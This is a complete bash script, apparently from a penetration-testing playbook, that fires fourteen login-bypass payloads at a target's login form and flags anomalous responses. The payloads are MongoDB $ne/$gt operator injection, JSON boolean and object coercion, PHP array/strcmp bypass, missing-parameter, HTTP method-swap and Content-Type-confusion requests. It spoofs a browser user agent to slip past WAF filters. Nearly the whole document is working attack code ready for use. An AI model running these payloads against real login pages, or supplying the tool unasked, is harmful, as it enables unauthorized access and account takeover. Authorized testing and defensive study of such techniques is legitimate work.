#!/bin/bash
# parameter_tampering_probe.sh
#
# Fire N parameter-tampering variants against a login form (JSON body coercion,
# PHP array-vs-string, missing-param, method swap, Content-Type mismatch),
# classify each response as `fail` (matches auth-fail signature) vs `CHECK`
# (anomaly worth manual inspection), and emit one summary line per variant.
#
# Enters from Login Bypass Techniques Section 3. Consumes SLFP-derived
# variables (`<fail_status>`, `<fail_marker>`, `<req_flags>` component values)
# already captured by the operator. Emits scan-friendly per-variant verdicts
# for follow-up `-i` inspection of any CHECK line.
#
# Usage:
#   parameter_tampering_probe.sh --host=<h> --port=<p> --form-action=<p> \
#                                --user-field=<f> --pass-field=<f> \
#                                --fail-status=<code> --fail-marker=<s> \
#                                [--cookies=<s>] [--hidden-fields=<s>] \
#                                [--extra-headers=<s>] [--scheme=<http|https>] \
#                                [--delay=<ms>] [--verbose]
#
# Required flags:
#   --host=<h>          Target hostname or IP
#   --port=<p>          Target HTTP/HTTPS port
#   --form-action=<p>   Login form POST action path (e.g., /login.php)
#   --user-field=<f>    Login form username field name (e.g., email)
#   --pass-field=<f>    Login form password field name (e.g., password)
#   --fail-status=<c>   HTTP status code that indicates auth failure (from
#                       auth_oracle_probe.sh FAIL_STATUS output; e.g. 200)
#   --fail-marker=<s>   Body substring that indicates auth failure (from
#                       auth_oracle_probe.sh FAIL_MARKER_CANDIDATE output;
#                       typically an HTML fragment from the login page)
#
# Optional flags:
#   --cookies=<s>       Forwarded static cookies, browser Cookie format
#                       "n1=v1; n2=v2" (Statefulness Probe STATIC_COOKIES).
#                       Sent as curl -b on every variant.
#   --hidden-fields=<s> Forwarded static hidden fields, POST-body format
#                       "n1=v1&n2=v2", values already URL-encoded (Statefulness
#                       Probe STATIC_HIDDEN_FIELDS). Sent as curl --data (raw)
#                       on FORM-encoded variants only; SKIPPED on JSON variants
#                       (form-encoded fields do not parse inside JSON bodies).
#   --extra-headers=<s> One operator-supplied header "Name: value". curl -H.
#   --scheme=<s>        URL scheme: http (default) or https
#   --delay=<ms>        Milliseconds between variant requests (default 0).
#   --verbose           Preserve sample dumps in WORK_DIR on exit for inspection.
#   --help, -h          Show this help
#
# Marker output contract:
#
#   Coverage warnings (always emitted FIRST — informational preamble; never
#   affect verdicts; boxed section with `====` bars):
#     - Fail signature reused across body-format changes may false-positive
#       (JSON-body variants that fall through to the app's form-fail path
#       return the same fail-sig; script cannot distinguish "app rejected
#       my body format" from "app processed and rejected auth").
#     - PHP array bypass requires the app parses the array (framework-
#       dependent); non-PHP apps return 400 or fall through to fail-sig.
#     - MongoDB $ne/$gt bypass requires Mongoose or similar body-parser;
#       non-Node.js apps ignore the operator syntax.
#     - Method swap (GET/PUT) reaching the SAME auth handler is uncommon;
#       most routers 405 or route to a different handler with no auth.
#     - Content-Type mismatch bypass requires the backend to trust the
#       claimed CT header over the actual body shape (uncommon defensively).
#
#   Baseline verification (BAIL if fails):
#     BASELINE_OK: baseline wrong-cred POST matches fail signature
#         Sanity check — operator's --fail-status + --fail-marker inputs are
#         correct and app is stable. Emitted before the variant loop.
#     BAIL: baseline mismatch <detail>
#         Operator inputs are wrong OR app changed since oracle derivation.
#         Re-run auth_oracle_probe.sh; do not trust any variant verdict.
#
#   Per-variant marker (one line each; always emitted):
#     <verdict> [status][size] <label>
#         verdict = "fail " (matches fail-sig, ignore) OR "CHECK" (anomaly)
#         status  = HTTP status code from response
#         size    = response body size in bytes
#         label   = variant descriptor incl. backend hint where relevant
#
#   Summary marker (always last on non-bail):
#     TAMPERING_SUMMARY: variants=<n> fail=<n> check=<n>
#     ROUTE: verify_candidates       (any CHECK verdicts to inspect)
#            OR: exhausted            (all fail → next LBT section)
#
#   Bail markers (mutually exclusive with per-variant output):
#     BAIL: <reason>
#         Fatal: baseline mismatch, curl error, invalid inputs.
#     RATE_LIMITED: sample=<name> <detail>
#         429 or rate-limit body pattern observed. Re-run with higher --delay.
#
# Variants fired (14 total; ordered by backend-class grouping):
#
#   JSON body variants (Node.js/Express/Mongo/mysqljs):
#     1. JSON pass=true                    boolean-coercion bypass
#     2. JSON pass=$ne null                MongoDB $ne operator injection
#     3. JSON pass=$gt ""                  MongoDB $gt operator injection
#     4. JSON pass=obj                     Node/mysqljs object-comparison bypass
#
#   PHP array parameter variants (loose comparison / strcmp bypass):
#     5. form user[]=arr                   username-as-array
#     6. form pass[]=arr                   password-as-array (strcmp bypass)
#     7. form user[] pass[]                both-as-array
#
#   Missing param variants (fail-open on absent fields):
#     8. form pass absent                  password field entirely missing
#     9. form user absent                  username field entirely missing
#    10. form pass empty                   password field empty string
#
#   Method swap (different handler on same route):
#    11. GET query string                  method → GET
#    12. PUT form body                     method → PUT
#
#   Content-Type mismatch (backend parser confusion):
#    13. form body, JSON CT claimed
#    14. JSON body, form CT claimed
#
# TRACE is NOT included — separate intent (header enumeration, not auth
# bypass), separate target (login_path, not form_action), separate verdict
# interpretation (echoed request headers, no fail-sig applicability).
# Handled inline in LBT after this script's invocation.
#
# Rate-limit self-defense:
#   Baseline sample response with status=429 OR body matching known rate-limit
#   patterns → BAIL with RATE_LIMITED before variant loop. Per-variant 429
#   detection: variant continues (each variant is one request), 429 is emitted
#   as a CHECK verdict (operator sees "CHECK [429][...]" and investigates).
#
# Deferred (not v1):
#   - Custom-per-target variant selection (--variants=json,array,method).
#     Fire-all-14 default keeps mental model simple; per-variant time cost is
#     low (~1s each, 14s total sequential).
#   - GraphQL-specific payloads (introspection, batch queries, alias abuse).
#     Different attack surface entirely; separate playbook if it arises.
#   - Multi-value repeated-key form bodies (e.g. `email=a&email=b`).
#     Framework-dependent behavior; rare on auth forms.
#   - Second-order bypass (payload persisted then triggered later). Requires
#     stateful multi-request flow; out of scope for stateless probe.

set -u

# ==============================================================================
# Constants
# ==============================================================================

TIMEOUT_SEC=10

# Chrome UA — curl's default UA trips WAF UA filters. Sent on every request.
# MUST stay byte-identical to auth_oracle_probe.sh / statefulness_probe.sh
# BROWSER_UA (drift-warning: change all three together).
BROWSER_UA="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"

# Baseline wrong-cred values — must NOT be a real user, must be non-empty
# (empty triggers different app path — validation error, not auth check).
BASELINE_USER="xyzabc123xxx@invalid.test"
BASELINE_PASS="wrong_ZZZ_9999"

# Rate-limit body patterns (case-insensitive substring, checked per sample).
# ⚠️ DRIFT-WARNING: mirrors auth_oracle_probe.sh / statefulness_probe.sh.
# Any change here MUST be mirrored in both other scripts.
RATE_LIMIT_PATTERNS=(
    "too many attempts"
    "too many requests"
    "rate limit"
    "rate-limited"
    "slow down"
    "try again later"
    "temporarily unavailable"
)

# ==============================================================================
# Globals populated by parse_args
# ==============================================================================

HOST=""
PORT=""
FORM_ACTION=""
USER_FIELD=""
PASS_FIELD=""
FAIL_STATUS=""
FAIL_MARKER=""
COOKIES=""
HIDDEN_FIELDS=""
EXTRA_HEADERS=""
SCHEME="http"
DELAY_MS=0
VERBOSE=no

# Derived from parsed args (set in main, after parse_args). Consumed by
# all request-firing functions — centralised so every variant hits with
# byte-identical browser headers.
AUTHORITY=""
REFERER=""
ORIGIN=""

# WORK_DIR — mktemp'd; per-variant files stored as <label>.body, .hdr, .meta.
# Trap-cleaned on exit unless --verbose.
WORK_DIR=""

# Running totals (populated by variant loop, consumed by summary)
G_FAIL_COUNT=0
G_CHECK_COUNT=0
G_VARIANT_COUNT=0

# ==============================================================================
# Usage / help
# ==============================================================================

usage() {
    cat >&2 <<'EOF'
Usage: parameter_tampering_probe.sh --host=<h> --port=<p> --form-action=<p> \
                                    --user-field=<f> --pass-field=<f> \
                                    --fail-status=<code> --fail-marker=<s> \
                                    [--cookies=<s>] [--hidden-fields=<s>] \
                                    [--extra-headers=<s>] [--scheme=<http|https>] \
                                    [--delay=<ms>] [--verbose]

Required flags:
  --host=<h>          Target hostname or IP
  --port=<p>          Target HTTP/HTTPS port
  --form-action=<p>   Login form POST action path (e.g., /login.php)
  --user-field=<f>    Login form username field name (e.g., email)
  --pass-field=<f>    Login form password field name (e.g., password)
  --fail-status=<c>   HTTP status code indicating auth failure (from
                      auth_oracle_probe.sh FAIL_STATUS)
  --fail-marker=<s>   Body substring indicating auth failure (from
                      auth_oracle_probe.sh FAIL_MARKER_CANDIDATE)

Optional flags:
  --cookies=<s>       Forwarded static cookies "n1=v1; n2=v2" (Statefulness
                      Probe STATIC_COOKIES). curl -b.
  --hidden-fields=<s> Forwarded static hidden fields "n1=v1&n2=v2", already
                      URL-encoded. curl --data (raw). SKIPPED on JSON variants.
  --extra-headers=<s> One operator-supplied header "Name: value". curl -H.
  --scheme=<s>        URL scheme: http (default) or https
  --delay=<ms>        Milliseconds between variant requests (default 0)
  --verbose           Preserve WORK_DIR sample dumps on exit
  --help, -h          Show this help

See top-of-script comment for full marker output contract.
EOF
    exit 1
}

# ==============================================================================
# Argument parsing
# ==============================================================================

parse_args() {
    while [ $# -gt 0 ]; do
        case "$1" in
            --host=*)          HOST="${1#--host=}"; shift ;;
            --port=*)          PORT="${1#--port=}"; shift ;;
            --form-action=*)   FORM_ACTION="${1#--form-action=}"; shift ;;
            --user-field=*)    USER_FIELD="${1#--user-field=}"; shift ;;
            --pass-field=*)    PASS_FIELD="${1#--pass-field=}"; shift ;;
            --fail-status=*)   FAIL_STATUS="${1#--fail-status=}"; shift ;;
            --fail-marker=*)   FAIL_MARKER="${1#--fail-marker=}"; shift ;;
            --cookies=*)       COOKIES="${1#--cookies=}"; shift ;;
            --hidden-fields=*) HIDDEN_FIELDS="${1#--hidden-fields=}"; shift ;;
            --extra-headers=*) EXTRA_HEADERS="${1#--extra-headers=}"; shift ;;
            --scheme=*)        SCHEME="${1#--scheme=}"; shift ;;
            --delay=*)         DELAY_MS="${1#--delay=}"; shift ;;
            --verbose)         VERBOSE=yes; shift ;;
            --help|-h)         usage ;;
            *)                 echo "ERROR: unknown argument: $1" >&2; usage ;;
        esac
    done

    [ -z "$HOST" ]         && { echo "ERROR: --host required" >&2; usage; }
    [ -z "$PORT" ]         && { echo "ERROR: --port required" >&2; usage; }
    [ -z "$FORM_ACTION" ]  && { echo "ERROR: --form-action required" >&2; usage; }
    [ -z "$USER_FIELD" ]   && { echo "ERROR: --user-field required" >&2; usage; }
    [ -z "$PASS_FIELD" ]   && { echo "ERROR: --pass-field required" >&2; usage; }
    [ -z "$FAIL_STATUS" ]  && { echo "ERROR: --fail-status required" >&2; usage; }
    [ -z "$FAIL_MARKER" ]  && { echo "ERROR: --fail-marker required" >&2; usage; }

    # --form-action must start with / (path, not full URL)
    case "$FORM_ACTION" in
        /*) ;;
        *) echo "ERROR: --form-action must start with /" >&2; usage ;;
    esac

    case "$SCHEME" in
        http|https) ;;
        *) echo "ERROR: invalid scheme '$SCHEME' (must be http|https)" >&2; usage ;;
    esac

    if ! [[ "$DELAY_MS" =~ ^[0-9]+$ ]]; then
        echo "ERROR: --delay must be non-negative integer (milliseconds)" >&2; usage
    fi

    if ! [[ "$FAIL_STATUS" =~ ^[1-5][0-9][0-9]$ ]]; then
        echo "ERROR: --fail-status must be a valid HTTP status code (100-599)" >&2; usage
    fi
}

# ==============================================================================
# Workdir setup / teardown
# ==============================================================================

setup_workdir() {
    WORK_DIR=$(mktemp -d) || { echo "ERROR: mktemp failed" >&2; exit 1; }
    if [ "$VERBOSE" = "no" ]; then
        trap "rm -rf '$WORK_DIR'" EXIT
    else
        trap "echo 'WORK_DIR preserved: $WORK_DIR' >&2" EXIT
    fi
}

# ==============================================================================
# URL / authority
# ==============================================================================

# authority — scheme://host[:port], omitting the port when it is the scheme
# default (80 for http, 443 for https), matching browser URL serialization
# for Referer/Origin. MUST stay byte-identical to auth_oracle_probe's
# authority() (both scripts derive Referer/Origin the same way).
authority() {
    if { [ "$SCHEME" = "http" ]  && [ "$PORT" = "80" ]; } || \
       { [ "$SCHEME" = "https" ] && [ "$PORT" = "443" ]; }; then
        printf '%s://%s' "$SCHEME" "$HOST"
    else
        printf '%s://%s:%s' "$SCHEME" "$HOST" "$PORT"
    fi
}

# ==============================================================================
# Fail-signature classifier
# ==============================================================================

# is_fail <status> <body_file> — return 0 (fail) iff status matches FAIL_STATUS
# AND body_file contains FAIL_MARKER as a fixed substring.
is_fail() {
    local status="$1" body_file="$2"
    [ "$status" = "$FAIL_STATUS" ] && grep -qF -- "$FAIL_MARKER" "$body_file"
}

# ==============================================================================
# Rate-limit detection
# ==============================================================================

# check_rate_limited <sample_name> — emit RATE_LIMITED and return 0 if throttled
check_rate_limited() {
    local name="$1"
    local status
    status=$(get_meta "$name" status)
    if [ "$status" = "429" ]; then
        echo "RATE_LIMITED: sample=$name status=429"
        return 0
    fi
    local pattern
    for pattern in "${RATE_LIMIT_PATTERNS[@]}"; do
        if grep -qiF -- "$pattern" "${WORK_DIR}/${name}.body" 2>/dev/null; then
            echo "RATE_LIMITED: sample=$name body_matched='$pattern'"
            return 0
        fi
    done
    return 1
}

# ==============================================================================
# Sample-metadata accessor
# ==============================================================================

get_meta() {
    local name="$1" key="$2"
    grep -oE "${key}=[^|]*" "${WORK_DIR}/${name}.meta" 2>/dev/null \
        | head -1 | cut -d= -f2- | tr -d '\n'
}

# ==============================================================================
# Delay helper
# ==============================================================================

delay_between() {
    if [ "$DELAY_MS" -gt 0 ]; then
        sleep "$(awk "BEGIN{printf \"%.3f\", $DELAY_MS/1000}")"
    fi
}

# ==============================================================================
# Sample runner
# ==============================================================================

# sample_variant <label> <method> <content_type> <body_kind> <body>
#
#   label        — human-readable variant name (also used as workdir file prefix,
#                  sanitised via label_to_filename)
#   method       — GET | POST | PUT
#   content_type — Content-Type header value; empty string = don't send header
#                  (correct for GET with no body)
#   body_kind    — "form" | "json" | "none"
#                    form: hidden-fields appended if present (raw --data)
#                    json: hidden-fields SKIPPED (form-encoded doesn't nest in JSON)
#                    none: no body sent (GET)
#   body         — the raw body payload (form-urlencoded string or JSON string)
#
# For GET: body is passed as query string in URL, not as request body.
#
# Fires the request through curl with:
#   - Always-on browser headers (UA, Referer, Origin) via BROWSER_UA + derived
#   - Content-Type header (unless empty)
#   - Forwarded state: cookies (-b), extra-headers (-H) always applied when set;
#     hidden-fields (--data raw) appended only for body_kind=form
#   - Body via --data-raw (bypasses curl's --data whitespace stripping)
#
# Writes body → <workdir>/<file>.body, headers → .hdr, curl -w metadata → .meta
# Returns curl's exit code (0 = success, non-zero = connection failure).
sample_variant() {
    local label="$1" method="$2" content_type="$3" body_kind="$4" body="$5"
    local file
    file=$(label_to_filename "$label")

    local url="${AUTHORITY}${FORM_ACTION}"
    if [ "$method" = "GET" ] && [ -n "$body" ]; then
        # GET: body goes into query string, not request body
        url="${url}?${body}"
    fi

    local args=(
        -s -k -X "$method"
        -o "${WORK_DIR}/${file}.body"
        -D "${WORK_DIR}/${file}.hdr"
        --max-time "$TIMEOUT_SEC"
        -H "User-Agent: $BROWSER_UA"
        -H "Referer: $REFERER"
        -H "Origin: $ORIGIN"
    )

    [ -n "$content_type" ] && args+=(-H "Content-Type: $content_type")
    [ -n "$COOKIES" ]      && args+=(-b "$COOKIES")
    [ -n "$EXTRA_HEADERS" ] && args+=(-H "$EXTRA_HEADERS")

    if [ "$method" != "GET" ] && [ "$body_kind" != "none" ]; then
        args+=(--data-raw "$body")
        # Hidden fields appended only on form-encoded bodies. JSON bodies get
        # the fields ignored — appending "&csrf=x" to a JSON body would produce
        # invalid JSON and the app would reject before parse. Cost: any hidden
        # field required by the app (rare in JSON APIs) has to be manually
        # injected into the JSON payload upstream. Acceptable given rarity.
        if [ "$body_kind" = "form" ] && [ -n "$HIDDEN_FIELDS" ]; then
            args+=(--data "$HIDDEN_FIELDS")
        fi
    fi

    args+=(-w 'status=%{http_code}|size=%{size_download}|type=%{content_type}\n')
    curl "${args[@]}" "$url" > "${WORK_DIR}/${file}.meta" 2>/dev/null
    return $?
}

# label_to_filename <label> — sanitise a variant label for use as a filename.
# Replaces non-alphanumeric with _ and lowercases. Labels are constants in
# fire_variants; sanitisation is defensive (matches auth_oracle_probe's
# naming) and keeps workdir listings readable on --verbose.
label_to_filename() {
    printf '%s' "$1" | tr '[:upper:] ' '[:lower:]_' | tr -cd 'a-z0-9_'
}

# emit_variant_line <label> — classify the sample and print one verdict line.
# Also updates running totals (G_FAIL_COUNT, G_CHECK_COUNT).
emit_variant_line() {
    local label="$1"
    local file
    file=$(label_to_filename "$label")
    local status size verdict
    status=$(get_meta "$file" status)
    size=$(get_meta "$file" size)

    # Rate-limit as per-variant CHECK (not BAIL — per-variant 429 is signal
    # to operator, not fatal, since we don't know if the app rate-limits
    # per-endpoint or per-request-shape).
    if [ "$status" = "429" ]; then
        verdict="CHECK"
        G_CHECK_COUNT=$((G_CHECK_COUNT+1))
    elif is_fail "$status" "${WORK_DIR}/${file}.body"; then
        verdict="fail "
        G_FAIL_COUNT=$((G_FAIL_COUNT+1))
    else
        verdict="CHECK"
        G_CHECK_COUNT=$((G_CHECK_COUNT+1))
    fi

    G_VARIANT_COUNT=$((G_VARIANT_COUNT+1))
    printf '%s [%s][%s] %s\n' "$verdict" "$status" "$size" "$label"
}

# ==============================================================================
# Baseline verification
# ==============================================================================

# baseline_check — fire one wrong-cred form-encoded POST; verify it matches
# the operator's --fail-status + --fail-marker inputs. BAIL if not.
#
# Rationale: if a request we KNOW should fail doesn't classify as fail, then
# either (a) the operator's fail-sig inputs are wrong, or (b) the app has
# changed since auth_oracle_probe.sh derived them. Either way, running the
# 14 variants would produce meaningless verdicts.
baseline_check() {
    local body="${USER_FIELD}=${BASELINE_USER}&${PASS_FIELD}=${BASELINE_PASS}"
    sample_variant "baseline" "POST" "application/x-www-form-urlencoded" "form" "$body" \
        || { echo "BAIL: baseline POST failed (curl error)"; exit 1; }

    if check_rate_limited "baseline"; then
        exit 1
    fi

    local status size
    status=$(get_meta baseline status)
    size=$(get_meta baseline size)

    if is_fail "$status" "${WORK_DIR}/baseline.body"; then
        printf 'BASELINE_OK: baseline wrong-cred POST matches fail signature [%s][%s]\n' "$status" "$size"
        echo ""
        return 0
    fi

    echo "BAIL: baseline wrong-cred POST does NOT match fail signature — inputs stale or app changed"
    printf '       expected: status=%s + body contains %q\n' "$FAIL_STATUS" "$FAIL_MARKER"
    printf '       actual:   status=%s size=%s (marker %s)\n' "$status" "$size" \
        "$(grep -qF -- "$FAIL_MARKER" "${WORK_DIR}/baseline.body" && echo present || echo absent)"
    echo "       → re-run auth_oracle_probe.sh to regenerate the fail signature"
    exit 1
}

# ==============================================================================
# Variant catalogue — fire all 14
# ==============================================================================

# fire_variants — the whole batch. Each row: label, method, content-type,
# body-kind, body. Body-kind determines whether HIDDEN_FIELDS get appended.
fire_variants() {
    local u="$USER_FIELD" p="$PASS_FIELD"

    # JSON body variants (Node.js/Express/Mongo/mysqljs)
    sample_variant "JSON pass=true (Node.js/Express)" \
        "POST" "application/json" "json" \
        "{\"${u}\":\"admin\",\"${p}\":true}"
    emit_variant_line "JSON pass=true (Node.js/Express)"
    delay_between

    sample_variant "JSON pass=\$ne null (MongoDB)" \
        "POST" "application/json" "json" \
        "{\"${u}\":\"admin\",\"${p}\":{\"\$ne\":null}}"
    emit_variant_line "JSON pass=\$ne null (MongoDB)"
    delay_between

    sample_variant "JSON pass=\$gt \"\" (MongoDB)" \
        "POST" "application/json" "json" \
        "{\"${u}\":\"admin\",\"${p}\":{\"\$gt\":\"\"}}"
    emit_variant_line "JSON pass=\$gt \"\" (MongoDB)"
    delay_between

    sample_variant "JSON pass=obj (Node/mysqljs)" \
        "POST" "application/json" "json" \
        "{\"${u}\":\"admin\",\"${p}\":{\"password\":1}}"
    emit_variant_line "JSON pass=obj (Node/mysqljs)"
    delay_between

    # PHP array parameter variants (loose comparison / strcmp bypass)
    sample_variant "form user[]=arr (PHP)" \
        "POST" "application/x-www-form-urlencoded" "form" \
        "${u}[]=admin&${p}=x"
    emit_variant_line "form user[]=arr (PHP)"
    delay_between

    sample_variant "form pass[]=arr (PHP strcmp)" \
        "POST" "application/x-www-form-urlencoded" "form" \
        "${u}=admin&${p}[]=x"
    emit_variant_line "form pass[]=arr (PHP strcmp)"
    delay_between

    sample_variant "form user[] pass[] (PHP both)" \
        "POST" "application/x-www-form-urlencoded" "form" \
        "${u}[]=admin&${p}[]=x"
    emit_variant_line "form user[] pass[] (PHP both)"
    delay_between

    # Missing param variants
    sample_variant "form pass field absent" \
        "POST" "application/x-www-form-urlencoded" "form" \
        "${u}=admin"
    emit_variant_line "form pass field absent"
    delay_between

    sample_variant "form user field absent" \
        "POST" "application/x-www-form-urlencoded" "form" \
        "${p}=x"
    emit_variant_line "form user field absent"
    delay_between

    sample_variant "form pass empty" \
        "POST" "application/x-www-form-urlencoded" "form" \
        "${u}=admin&${p}="
    emit_variant_line "form pass empty"
    delay_between

    # Method swap
    sample_variant "GET query string" \
        "GET" "" "none" \
        "${u}=admin&${p}=x"
    emit_variant_line "GET query string"
    delay_between

    sample_variant "PUT form body" \
        "PUT" "application/x-www-form-urlencoded" "form" \
        "${u}=admin&${p}=x"
    emit_variant_line "PUT form body"
    delay_between

    # Content-Type mismatch (backend parser confusion)
    sample_variant "form body, JSON CT claimed" \
        "POST" "application/json" "form" \
        "${u}=admin&${p}=x"
    emit_variant_line "form body, JSON CT claimed"
    delay_between

    sample_variant "JSON body, form CT claimed" \
        "POST" "application/x-www-form-urlencoded" "json" \
        "{\"${u}\":\"admin\",\"${p}\":\"x\"}"
    emit_variant_line "JSON body, form CT claimed"
}

# ==============================================================================
# Emission: run config, coverage warnings, summary
# ==============================================================================

emit_run_config() {
    echo "=============================================================================="
    echo " parameter_tampering_probe.sh — run config"
    echo "=============================================================================="
    echo " Target        : ${AUTHORITY}"
    echo " Form action   : ${FORM_ACTION}   (POST target for baseline + most variants)"
    echo " Fields        : ${USER_FIELD} / ${PASS_FIELD}"
    echo " Fail sig      : status=${FAIL_STATUS} + body contains fail marker"
    echo " Delay         : ${DELAY_MS} ms between variants"
    echo ""
    echo " Always-on headers (every request):"
    echo "   User-Agent  : ${BROWSER_UA}"
    echo "   Referer     : ${REFERER}"
    echo "   Origin      : ${ORIGIN}"
    echo ""
    echo " Forwarded state (from Statefulness Probe; passed via flags):"
    echo "   --cookies       : ${COOKIES:-(none)}"
    echo "   --hidden-fields : ${HIDDEN_FIELDS:-(none)}"
    echo "   --extra-headers : ${EXTRA_HEADERS:-(none)}"
    echo ""
    echo " Side-effect     : issues 15 POSTs (1 baseline + 14 variants) to ${FORM_ACTION}"
    echo "                   → counts toward any per-IP failed-attempt threshold"
    echo "=============================================================================="
    echo ""
}

emit_coverage_warnings() {
    echo "=============================================================================="
    echo "COVERAGE WARNINGS (informational — always emitted; verdicts require manual verify)"
    echo "=============================================================================="
    echo "- Fail signature reused across body-format changes may false-positive — JSON-body variants that fall through to the app's form-fail path return the same fail-sig; script cannot distinguish 'app rejected my body format' from 'app processed and rejected auth'. CHECK-verdict inspection is mandatory."
    echo "- PHP array bypass requires the app parses the array (framework-dependent); non-PHP apps typically 400 or fall through to fail-sig."
    echo "- MongoDB \$ne/\$gt bypass requires Mongoose or similar body-parser; non-Node.js apps ignore the operator syntax entirely."
    echo "- Method swap (GET/PUT) reaching the SAME auth handler is uncommon; most routers 405 or route to a different handler with no auth."
    echo "- Content-Type mismatch bypass requires the backend to trust the claimed CT header over the actual body shape; uncommon defensively but does occur in older PHP/Perl apps."
    echo "=============================================================================="
    echo ""
}

emit_summary() {
    echo ""
    printf 'TAMPERING_SUMMARY: variants=%d fail=%d check=%d\n' \
        "$G_VARIANT_COUNT" "$G_FAIL_COUNT" "$G_CHECK_COUNT"
    if [ "$G_CHECK_COUNT" -gt 0 ]; then
        echo "ROUTE: verify_candidates (re-run with --verbose; inspect .hdr and .body in WORK_DIR)"
    else
        echo "ROUTE: exhausted (all variants matched fail-sig; proceed to LBT Section 4)"
    fi
}

# ==============================================================================
# Main
# ==============================================================================

main() {
    parse_args "$@"
    AUTHORITY="$(authority)"
    REFERER="${AUTHORITY}${FORM_ACTION}"
    ORIGIN="${AUTHORITY}"
    emit_run_config
    emit_coverage_warnings
    setup_workdir
    baseline_check
    fire_variants
    emit_summary
}

# ==============================================================================
# Source guard: only run main if executed, not sourced (for tests)
# ==============================================================================

if [ "${BASH_SOURCE[0]}" = "$0" ]; then
    main "$@"
fi
